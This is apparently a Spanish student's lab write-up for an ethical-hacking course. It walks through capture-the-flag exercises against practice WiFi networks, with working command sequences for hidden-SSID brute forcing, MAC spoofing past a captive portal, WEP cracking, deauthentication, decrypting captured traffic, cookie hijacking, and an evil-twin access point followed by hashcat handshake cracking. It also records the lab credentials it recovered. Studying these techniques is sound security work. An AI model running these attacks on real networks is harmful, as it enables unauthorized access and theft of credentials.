[[Home]]/[[CETI]]/[[Hacking Ético]]

# comandos:

  

airmon-ng start wlan0 

Convierte lo que viene en esa vlan en modo monitor/promiscuo y crea una nueva wlan, wlan0mon

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfJUbsKos-9Y2KoTElZjdbmAz00ZGStbMuUcyFtD57V5neUO7JJx4RVB1BOW7XFzN8IFWOoAl9lAGPIJjnBQhCIZHpR0pbwt8Q8X1lSqYGI82SUC_1j_CZFbT4sAvunU7K9TH3zHw?key=guR6kJWpYbMi9eVMXwKptnIU)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfclumWHpbBTOLsAzTqYelMUjLOI9BYtsCqRNrjYKJKgfPrB96YbASqvVqAq2Xwmw53RGCdQJNWOHft5T0q4nvvwNZ6zBV6dax9fow5qen8qwwpt_BkBgxvkeqfNeV2JvMvtMmEIQ?key=guR6kJWpYbMi9eVMXwKptnIU)

  

airodump-ng wlan0mon -w . --manufacturer --wps --band abg

Captura datos sobre el wifi en este caso en el directorio que marcamos con -w y los datos son las etiquetas que decimos, manufacturer el fabricante, wps (activada la conexión rápida) y las bandas band abg

  
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfPj99uyt7OQ2u6gECijmmGWniBN464tPwk6q5Ub1phW2lrzh8ce82QDtU3hmq2xGqXKmcmSO3vTqQ8qGz_Sce0rnxpqnlss8dep-UZDYj12JcrMrMZzJ-yNYIYYQYb-rsg_RcY?key=guR6kJWpYbMi9eVMXwKptnIU)  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

Arriba están los access point y abajo lo que está conectados ellos

  

puedes filtrar con -c 11 el tipo el canal que quieres buscar por ejemplo.

con -w escribe en un documento

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeysfHlJ8hDHrjqINNMLF__1wcTm83SXjUfFQgHfg4VBiErsxI0uTOys8t63DiCQ6anP3FxTfamcQbtPQy0dhcQue0RXbOpZFOY93DVs55txitd9DvBSttCEe-veOpq-povdUgH5Q?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Ejemplo: Se puede apreciar que el cliente conectado al router wifi-it tiene la MAC 10:F9:6F:AC:53:52

  

Ejemplo 2: A la derecha de los clientes podemos ver el nombre de los dispositivos conectados como Wifi-offices, Jason

  

# SSID oculta

  

usamos mdk4 para un ataque de fuerza bruta usando rockyou modificada, usaremos el siguiente comando para la siguiente dirección MAC:  
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdAwUMrxOOUJqyCiRzMwMRKFvfjOqW794QzYVFZGq2QzcaDkEfLqd-3nBC5zMvwRh0rP6NEkbMoVI1yNiYzJnlHIyFp46QJ5cJKaj3vSU052ugcrmHrO2qTKxhOsxwLelcUqd0M?key=guR6kJWpYbMi9eVMXwKptnIU)

  

primero usaremos rockyou como sabemos que son 9 letras usaremos rockyou filtrando primero en 4 letras ya que todas empiezan por wifi-

  

grep -E '^[a-zA-Z]{4}$' rockyou.txt >  rockyou_4letras.txt

  

Luego añadimos wifi- al principio de cada palabra:

sed 's/^/wifi-/' rockyou_4letras.txt > rockyou_wifi.txt

  
  

Luego establecemos la wlan0mon en el canal que buscamos que está la red, en este caso el 11.

  

iwconfig wlan0mon channel 11

  

Finalmente hacemos un ataque con 

  

mdk4 wlan0mon p -t <MAC> -f ~/rockyou_wifi.txt

  

siendo -t la interfaz para atacar y -f la world list a usar

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc1krmj_V1T3XN78saiNHN7tPqBTYbM0UOuNJVtynvwWDj2gKizMRORdp9sH-kD3ZIjmFEYleF01i4QeZyZjzkovmH-N7gCqvZ33ojn-0WwJTJ_TJz83tPcRfzu-HA5MwQhmKVehQ?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Vemos que es wifi-free es la SSID del WiFi oculto.

Para entrar al wifi-free nos conectamos al DHCP creando un archivo de configuración para entrar al wifi.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdFbG82er6igahLSDYGX6md3vJAGOEP5eIH8TVYm08ZO2TaHCS7IGW1zNHg_dlvNzK8MSHVo49dkTuD4pLcIvz2unw2EklAH4Fik6Rj8LJiSAO9mbQ03eAxGtjPzU1WDPeZkx2U?key=guR6kJWpYbMi9eVMXwKptnIU)

  

y usamos el siguiente comando, esto hace que el driver (Dnl80211) de wifi permite conectarse con la interfaz wlan1 a la red mediante la configuración del archivo.:  
  

wpa_supplicant -Dnl80211 -iwlan1 -c c_red.conf

  

y nos conectamos a la red mediante:

  

dhclient wlan1 -v

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfryGkxOBU72MoSw3O1KoCb2v_Cr7FaNkJIL5hwMM2sXXEnpIPEq1qHO5P3Q8ap1Au56__VciYL85Vv6I-fPAU9Fe7zkOs4atjxrKrL5Ii73ZvPUynJBpnw9JLBs0XDdhHHJHfGBQ?key=guR6kJWpYbMi9eVMXwKptnIU)

# Conectarse a red invitado

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXckIYlaSymfsB-S6H147rdQC1YKbfoAcYCpoh0QNLkb65nKXxMaje59tUsAxRe3IOG7h0AjUoTq63r3BPyK-kUZYPuDfKLox6nOC9kxia7uPbnHLmVUno7OYX2gVufLq3K44t4BLg?key=guR6kJWpYbMi9eVMXwKptnIU)

  

volvemos a crear otro archivo .conf, dado que no tiene contraseña

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcmd_PqvoRyE5udqWRxEclftCJwc9k8rA66TuAFr6uFGtQ2OGtEMxhHy1wHdC250kgrnDDklnPl_SwkjsUJjEmtX55-40BNttNSVnJhQYLZUNVlMO_IXOC_RjVrBqCXIoCJSsAa0g?key=guR6kJWpYbMi9eVMXwKptnIU)

  

usamos el mismo comando anterior pero en la wlan2

  

wpa_supplicant -Dnl80211 -iwlan2 -c wifi-guest.conf

  

y nos conectamos a la red mediante:

  

dhclient wlan2 -v

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeEI1NEfOStRYJobbWULq3GMnqGUpHrwNXb4MkjyM4wNMkRfwoHvbn_XY-Mv7EHwnZp6oDtCCFeGLMJsAfqDQXRKMX4StOvT0HZK4YZUV0qtI7BZeFOZ5RmmqXQeD5uYP9pk1xc_w?key=guR6kJWpYbMi9eVMXwKptnIU)

  

al intentar entrar al router vemos que tiene un login

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdTpLYxwO1njBQ4QEaMdoClxSk-5g7QizknI9j_cWX658ATBKl2piz1kTErr7JQKROKigyR7JtKo2XhxC92GbC56qmQz8szkLxqTgoRIhs2E5OMtEbtI2K1X8r7v9WEibz0XASECg?key=guR6kJWpYbMi9eVMXwKptnIU)

  

así que volvemos a escanear la red

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd2PRIlMUPQYIFXd9aYXcsD1tGD0gnBgHs2lXTB-Nwz_eRvGBmRaQrXh_5ptwKvjnXIaLMM7na09DHqsLEatD4jqwjgTduZP12FsO2cl5tXIHzweTALaxZtP0jSeKLofYJ-lb2XgA?key=guR6kJWpYbMi9eVMXwKptnIU)

  

y cogemos como objetivo la MAC B0:72:BF:44:B0:49 para suplantar la

  
  
  

primero apagamos el servicio de red con el siguiente comando

  

systemctl stop network-manager

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc8un715EQroTqHPUhOdlHUdCpLseF3kI2cKiVmnsp8qZxcKbynsr2agAE1HUkZ5fNP3LbhRLlsqncKHB0WqIsyzzIpDOK7C0fR8bwT97f-Mo0OhfJb_SbLsRtBfGTyqHD0PaN8gA?key=guR6kJWpYbMi9eVMXwKptnIU)

  

apagamos la interfaz wlan2 con:

  

y cambiamos la mac con el siguiente comando

  

macchanger -m B0:72:BF:44:B0:49 wlan2

  

finalmente volvemos a encender la wlan

  

ip link set wlan2 up

  

 y volvemos a conectarnos con dhcp con el archivo de configuración que hicimos antes:

  

wpa_supplicant -Dnl80211 -iwlan2 -c wifi-guest.conf

  

dhclient wlan2 -v

  

Finalmente abrimos el .cap que conseguimos con el airodump  

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc0N_8ovGD5WzSNk8cJ7TGSyyvcnGWpa-GsFmn29M5yDIJaAn7ZJ5VS5VlUzphzeQxSPoXXXx2FHpw6KHpVCLvrAOEgJ6IZsPAZvBDkTbGDCXxmKIhJewRsx-oKI9Sm0iU5_cwpJA?key=guR6kJWpYbMi9eVMXwKptnIU)

  

y filtramos por http

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfz-qPU4rqIIenm2kKLhN_QDZ4HM6-2C8JmTKvIS4EFxCI9xe2qN8UesPKhS3N8wEPkbrS8uvlTVSvCxLcXETL3QAibkxkF6LJ4-ElBQldgH4sv-I-9VZqNn47nmeHptdcTzNTU0A?key=guR6kJWpYbMi9eVMXwKptnIU)

  

vemos que alguien ha hecho login y hacremos un http stream

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeAnnofeRTzTRG0q-9M3Ke6C6YJPu_-fQHmnM2yEJIfkYFFsek7lWpRf-huUPEB8rKrMV1QEdidmhG-L3LkQq2KDRsXpqwO-Jj_h3jAU7nWCe8uPCX8rNrOOd4XjTbyjNQzScPP?key=guR6kJWpYbMi9eVMXwKptnIU)

Sabemos que el username  es free2 y la contraseña 5LqwwccmTg6C39y, al tener la nueva MAC podemos entrar a la página de login de verdad.

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcqgfJOoTTDdYPo2Af0_L2JBC4EjxUJrDZ5tT33YH7gXHmaf5-FuK-0ggThmC9FMXT0bK-57TwKfSkQxPZJZgIPIGzlVlV6D5neCO6lrPLqbxCGBZsJNVxvghkfvvQip8WaMnM9LQ?key=guR6kJWpYbMi9eVMXwKptnIU)

  
  

# Entrar a una red wifi con WEP

  

buscaremos wifi-old que está en el canal 3, para ello usaremos

  

airodump-ng wlan0mon -c3

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdNisD9svhzYH9wT017yYZC28z7FNJ8OCsNf-9P-rZUKK25PxwczV4k1IgwXhaJkXO8f4YV-ER5r5DzdOnTr1_aoJNWmUQ42vtw9uuIiOL59nwehNmQUETyZoyzK5DPXdc1cUlcew?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Atacamos por la MAC con el siguiente comando (documentar).

  

besside-ng -c 3  F0:9F:C2:71:22:11 -b wlan4 -v

  

Otra opción es usar estos comandos en este orden y a la vez.

  

Captura datos en un archivo, este archivo es la entrada para que aircrack-ng descifre la contraseña.

sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w wifi-old wlan0mon

  

Para generar algunos datos adicionales podemos lanzar una autenticación falsa al AP (al mismo tiempo)

aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon

  

Y generar algo de tráfico lanzando un ataque de repetición de solicitud ARP (al mismo tiempo)

aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h BA:49:A9:53:A2:7C wlan0mon

  

Descifrar la contraseña con los datos capturados en un comando anterior. (al mismo tiempo)

sudo aircrack-ng wifi-old-01.cap

  

y nos dará la clave 11:bb:33:cd:55

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcbep8gQAqWxkb1hkJtzijUzePqFiuMDtEgqQWytbbtopt5H4tbeq5ZspWdKEJEVKZ2pWknSCxU7Cp-0ai5y1xnzxr7MgMfqDLGBVa_FoZmbKb7kbJ9MfcwU1rGFYgh1auC3yIhTg?key=guR6kJWpYbMi9eVMXwKptnIU)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcUzzKvagU0HeVq_Fi5LrslSVv14rAjpgWzERc1puYX8FuLHhCxATR6nycbcANWcGnhGelLuXEzLxjO0CmVpanMgXuj0n2g1UkmGvwwKvYCzD0n-qKHcx4_8mU4kbzHWYwN_yxTWg?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Creamos el nuevo archivo de configuración en este caso lo llamamos old_wifi.conf

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfclq7NgFP1LomzcDLZmSeexQfNeKIee1moy-6LDXc4Lunfe9b3gzYROK97i_KtbN12jYUtA_qaSlsAdZoIGxBPSPFlHnBYzOitn15JcTGkML1tJJNglFWELOe7eFkw8Lxsgne6?key=guR6kJWpYbMi9eVMXwKptnIU)

  

# ¿Cual es la contraseña del wifi móvil?

  

Monitoreamos el tráfico con: 

  

airodump-ng wlan0mon

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfy6sgqM-tRlR1Y4XgyCQdyq1AB4iVaCnnGvjY1ys9XzXjCmBRlFJ7I5s5jf-7hv57J7sxVESGtDCC0nrgXi8StWe0KXp_bHCMRxi8pygDtKg-onwqnXAyvmDiw5Qo44knLAHtZ6w?key=guR6kJWpYbMi9eVMXwKptnIU)

  

una vez identificado hacemos el mismo comando pero para guardar los registros:

airodump-ng wlan0mon -w ./Scanc6 -c 6 --wps

  

Hacemos un ataque de desautenticación con el siguiente comando y la MAC  objetivo F0:9F:C2:71:22:12 a la vez que se recogen los datos:

  

aireplay-ng -0 10 -a <MAC> wlan0mon

  

-0: Este parámetro indica que se va a realizar un ataque de desautenticación. El número "0" se refiere al tipo de ataque que se va a ejecutar.

  
10: Este número especifica la cantidad de paquetes de desautenticación que se enviarán. En este caso, se enviarán 10 paquetes.

  
-a <MAC>: Este parámetro especifica la dirección MAC del punto de acceso (AP) al que se desea enviar los paquetes de desautenticación. La dirección MAC es única para cada dispositivo en una red.

wlan0mon: Este es el nombre de la interfaz de red que se está utilizando. "wlan0mon" sugiere que la interfaz está en modo monitor, lo que permite capturar y enviar paquetes en la red Wi-Fi.  
  

Finalmente usamos una world list para hacer una ataque por fuerza bruta para la contraseña:

aircrack-ng ./Scanc6-01.cap -w ~/rockyou-top100000.txt

y elegimos cual queremos:

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeAezuWZjCTJYeWeysHrBlMGDPL8XB8BU6TJma13z8bnu9BfszxeeZmxdu4h3TqrNJ6_vE9ljw3wpjh_IKcHeEJz0jEfNTVRdnRhBXChOpd90nkmjiKSlvqEuUiprkebp0yVeUVMw?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Conseguimos la contraseña starwars1

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdyBHOAqV2GG6Qn8rXOJ4kXfRD0eOg7vyTkbvQ-ZmKO3F7IalHY7HFFuKe8lO6o7e-Zbx7HBx2nPQ587avnzNtPTam-QlpMpcUTNxoPzaw0nzwpWK-Hr_1quVTJzKsE1Sb8S0gh?key=guR6kJWpYbMi9eVMXwKptnIU)

  

## ¿Cual es la IP del servidor web en la red wifi-móvil?

Si disponemos de un handshake y la contraseña de la red, podremos descifrar el tráfico de cada uno de los usuarios tras el handshake, siendo muy similar a las redes abiertas del apartado anterior.

  

Para ello podemos utilizar “airdecap-ng” y luego abrir el archivo generado con “Wireshark” para obtener la IP del servidor HTTP.

  

usaremos el siguiente comando:

  

airdecap-ng -e wifi-mobile -p <contraseña> ./Scanc6-01.cap

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdfgNdDoRv2PzYtaaOFZDphtnFhtOUVS3lillfMitpHFxQwrf-r8hKqxR4uyI74mBnlX1IX4s8COp291ozjAl4g2IQCYvcpYhcFSW4nOATuAPpRnYCL5t-JMKvDWEKBIxjlX2QwnA?key=guR6kJWpYbMi9eVMXwKptnIU)

  

nos dará el siguiente archivo, el cual abriremos por wireshark mediante:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfc2Fjs16E9kdyi5jbJbzj4fPtCGWWm48aGDfSaysFEzI33aegqaqzWtA7H0uu7nV7uN-OnvVcQ33jHFXOLcMIqTrwOImFGhf7oM5AkiB8lFa4RsWUMVh7DDEQ5l36pnZSc5Pchug?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Finalmente lo abrimos con wireshark

  

wireshark ./Scanc6-01-dec.cap

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcSnZz2SBxQXDc73aDBGiES7zFjnka_7dBgbp9-nieVh5Ez5_-RqBcewvvESmiYC5f_O1iZ6dNO_1n0ErueKEiplpg0ETVHatifGkqC0uRDttV0I0ZcRx0CexZRnlVH_R6QT2Rwkg?key=guR6kJWpYbMi9eVMXwKptnIU)

Buscamos en un GET y en hypertext podemos ver que la web es [http://192.168.2.1/lab.php](http://192.168.2.1/lab.php)

## ¿Cuál es la flag después de iniciar sesión en wifi-mobile?

Primero nos conectamos a la red para eso creamos el archivo de configuración para la red.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdr39jPbs8R6uH99jk5bmUtB7nLH3orZWxOpB3bslhz1tx0wZmbCy2vRFY2RYkHheFoQK-dpD5uBzQ3ySyfON_a0tuCckJU3T9KP8q-LkdLairVk816lEDBUmXNXJ6v-GX0d3yx?key=guR6kJWpYbMi9eVMXwKptnIU)

  

y nos conectamos con los comandos:

  

wpa_supplicant -Dnl80211 -iwlan3 -c wifi-mobile.conf

dhclient wlan3 -v

  

Finalmente podemos usar las cookies que nos proporciona wireshark para ello:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc-YmyHiYao-cvcG9h5Sx4rp91f830XEjG7n0Gn-Fgwgx5k3i5l0idaKZO09odbYC8rKe_gYjAEd_RLxP8v2Fi3wZcczdtR_zwmH0x4_W4GKptp_B3sW8Gxa9w4bW5m55alwwmu3A?key=guR6kJWpYbMi9eVMXwKptnIU)

  

inspeccionamos la web y nos vamos a storage y ahi pegamos la cookie

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeNssnA8V4Pd1FxWRcUVxbRRbVYD9OGLvZ3TxRzpaoxG5qOl2YejRSAZyNmSvYoDZhClwnHfDG4Lqyk653UgUB6uUiM-lBnDdVnGsjDeOLogjj2wPnCTjDHpLQP4l3WTrjJfcp1og?key=guR6kJWpYbMi9eVMXwKptnIU)

  

y le damos a f5:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeE_NEEP5T1Gn64IEwlzGG1RujcKwQUZSVdG4tTC7qttLc3fTuGWOe3kmtyziZ4PEUwJRojjeSyBB0sv9hAvh_A2TYVmaKJneMOxo0c6BGjuT8T-9-0YJt_8YzcOumeft0IwQCHCQ?key=guR6kJWpYbMi9eVMXwKptnIU)

## ¿Existe aislamiento de clientes en la red wifi-móvil?

Aún conectados en la red de wifi-mobile probaremos si es posible la interacción entre clientes en el mismo wifi o está aislado, para ello usaremos el siguiente comando:

  

arp-scan -I wlan3 -l

  
  

arp-scan: Este es el comando principal que se utiliza para realizar el escaneo ARP.

  

Parámetros

  

-I wlan3: Este parámetro especifica la interfaz de red que se utilizará para el escaneo. En este caso, wlan3 es la interfaz de red inalámbrica. Puedes reemplazar wlan3 con el nombre de la interfaz que desees utilizar (por ejemplo, eth0 para una interfaz Ethernet).

  

-l: Este parámetro indica que se debe escanear la red local. -l es un atajo para --localnet, lo que significa que arp-scan determinará automáticamente la red local a la que está conectada la interfaz especificada y escaneará todas las direcciones IP en esa red.

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeJDHSGgFCSaNF1T0xooTp1ziOSBloK2ldnZZCKQdVrNtnqgc4drkWeqrqSN6u2CgIBOoEQmQkf0Cuv2i6RximGbsbnW5eAOi5_D3VSR04tUXy-oKQnKwJvOWpN8Ek8lAg-ppU3Zw?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Usamos una ip local de un cliente como 192.168.2.7 y usamos el siguiente comando para solicitar información a otro cliente:

  

curl 192.168.2.7

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfzkf8Ql3KTOzVFsxtqBg7cPHTkfwCmhTTB4oNPOwIWN8-VkXx3Z1VgM-u6l-VK3J1zaE6UbZZHy2C3x9Tg3y9KTWqOQpY4T_iPNdHOcO6M6EQJ8tmG2ppNq2nxk3mgW8cTnFvy?key=guR6kJWpYbMi9eVMXwKptnIU)

  

Así comprobamos que no se aislan los clientes entre sí.

# ¿Cuál es la contraseña de wifi-offices?

Resultado de : airodump-ng wlan0mon

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeuldvEAT6FOpLB98tAjghNdbcs1LQsadOShW7PKdJorqAhV6N8i16531qfm4bDrYZblEEl-HpfsKaJMNKygH_4FkiQRk4gxTa-D0EIDE64xTHf-xnKpMfqU45CWI3V7oQKxbzWhA?key=guR6kJWpYbMi9eVMXwKptnIU)

  

La red WiFi-Offices no es visible, por lo que está en otra ubicación o tal vez ya no está allí, pero aún podemos obtener su contraseña creando un Punto de acceso falso falso con "hostapd-mana" y obtener el handshake de los clientes que preguntan por esta red automáticamente para realizar un ataque de diccionario contra ella y obtener la contraseña en texto claro.

  

Creamos el siguiente archivo donde lo más importante es que tenga la SSID y esté en una banda que acepte los dispositivos locales:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfgHmLx0LeAAIYGxLOL3ZQR6BHVlVZbtnwiBHq_eRDgwgj0s49M7UZBnWNdtwug6o9VgeDAcMzOmMmiWSDcCaySlj2d2SAnkZcW-l7S1jal0Ud8MMfgMVdq6EgZ-c2hku399nPjgw?key=guR6kJWpYbMi9eVMXwKptnIU)

Parámetros

  
  

interface=wlan1 Especifica la interfaz de red que se utilizará para el punto de acceso.

driver=nl80211 Indica el driver que se utilizará para la interfaz.

hw_mode=g g indica que el punto de acceso funcionará en el modo 802.11g, la banda.

channel=1 Este parámetro especifica el canal en el que operará el punto de acceso.

ssid=wifi-offices Este parámetro define el SSID.

mana_wpaout=hostapd.hccapx Este parámetro es específico de mana y se utiliza para especificar el archivo de salida donde se almacenarán los datos de autenticación WPA capturados. (en este caso.hccapx)

  

wpa=2 Este parámetro indica que se utilizará WPA2.

wpa_key_mgmt=WPA-PSK Especifica el método de gestión de claves que se utilizará. 

wpa_pairwise=TKIP CCMP Este parámetro define los métodos de cifrado que se utilizarán para la comunicación. TKIP (Temporal Key Integrity Protocol) y CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol) son dos métodos de cifrado.

wpa_passphrase=12345678 Este parámetro establece la frase de contraseña que se utilizará para la autenticación WPA.

  

Una vez configurado, usaremos el siguiente comando para obtener los datos:  
  
hostapd-mana hostapd.conf

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcq_H3w3JfKn0dfmXUaaFE64dHvyNNI7rtcaWZ_4cyMFHMOKOcBmG7hIgKfeK94KfbpOhy4Mi9rwbKagZSQh3puYuy-99qRz6Z-sas9B2bOoJyy8qYtdBwUIo-4afOgBn5KvXE04w?key=guR6kJWpYbMi9eVMXwKptnIU)

  

pulsamos Control + C para cancelar el proceso cuando creamos que hemos obtenidos suficientes “AP-STA-POSSIBLE-PSK-MISMATCH”

  

Usaremos hashcat para hacer un ataque de diccionario con rockyou100000 gracias al siguiente comando:

  

hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force

  

Parámetros:

  

hashcat Invoca la herramienta Hashcat.

-a 0 Este parámetro especifica el modo de ataque, 0 indica que se utilizará un ataque de diccionario.

-m 2500 Este parámetro especifica el tipo de hash que se está atacando, 2500 se refiere a los hashes de WPA/WPA2. 22000 para WPA3.

hostapd.hccapx Este es el archivo que contiene los hashes.

~/rockyou-top100000.txt Este es el archivo de diccionario.

--force Le dice a Hashcat que ignore ciertas advertencias que podrían impedir que el programa se ejecute. (Tener cuidado si no es en máquina virtual).

Si no funciona, convertimos los hashes a 22000 (WPA3) con los siguientes comandos:

  

hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap

  

Parámetros

  

hcxhash2cap Invoca la herramienta hcxhash2cap. 

  

--hccapx=hostapd.hccapx Archivo de entrada

  

-c aux.pcap Archivo de salida.